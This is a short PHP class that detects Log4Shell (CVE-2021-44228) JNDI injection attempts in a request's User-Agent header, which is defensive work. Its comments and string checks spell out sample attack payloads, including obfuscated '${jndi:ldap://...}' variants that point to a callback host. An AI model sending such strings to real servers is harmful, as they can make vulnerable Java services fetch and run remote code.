<?php
class Logjam_Filter {
    
    public static function logjam_check( $user_agent = '' ): bool {
        # Attempts to exploit CVE-2021-44228
        # Standard
        # - ${jndi:ldap://,${jndi:rmi://,${jndi:ldaps://,${jndi:dns://
        if ( empty( $user_agent ) ) $user_agent = strtolower( rawurldecode( urldecode( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) );
        if ( false !== strpos( $user_agent, 'jndi' ) ) {
            if ( false !== strpos( $user_agent, 'jndi:ldap' ) ||
                 false !== strpos( $user_agent, 'jndi:rmi' ) ||
                 false !== strpos( $user_agent, 'jndi:ldaps' ) ||
                 false !== strpos( $user_agent, 'jndi:dns' ) ) {
                 return true;
            }
        }
        # Deal with variants
        # Examples
        # - ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostname}
        # - ${jndi:${lower:l}${lower:d}a${lower:p}://[subdomain]${upper:a}[domain]:80/callback}            
        if ( substr_count( $user_agent, '$' ) >= 4 &&
             substr_count( $user_agent, '{' ) >= 4 &&
             substr_count( $user_agent, '}' ) >= 4 &&
             substr_count( $user_agent, ':' ) >= 4 ) {
                $list = array( '$', '{', '}', ':', '-' );
                $flist = str_replace( $list, '', $user_agent );
                if ( false !== strpos( $flist, 'ldap' ) ||
                     false !== strpos( $flist, 'rmi' ) ||
                     false !== strpos( $flist, 'ldaps' ) ||
                     false !== strpos( $flist, 'dns' ) ) {
                     return true;
                }
        }
    return false;
    }
}
?>
